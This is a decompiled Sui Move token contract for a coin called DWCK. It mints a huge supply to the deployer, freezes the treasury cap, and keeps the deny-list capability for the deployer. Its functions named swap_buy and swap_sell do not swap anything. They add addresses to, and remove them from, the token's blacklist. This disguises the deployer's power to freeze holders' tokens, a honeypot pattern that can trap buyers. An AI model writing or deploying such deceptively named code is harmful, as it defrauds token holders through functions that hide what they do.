module 0x7bd066ff3b87f44361ad2d787bdb35cbffe9da72fecbf14714641ab214d16ec4::dwck {
    struct DWCK has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: DWCK, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<DWCK>(arg0, 9, b"DWCK", b"DWCK", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmT4fxcqrZyrtq24u6UeUyxYXWrqKvtYprnQX4PUR15x2o"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<DWCK>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DWCK>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<DWCK>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<DWCK>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DWCK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<DWCK>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DWCK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<DWCK>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

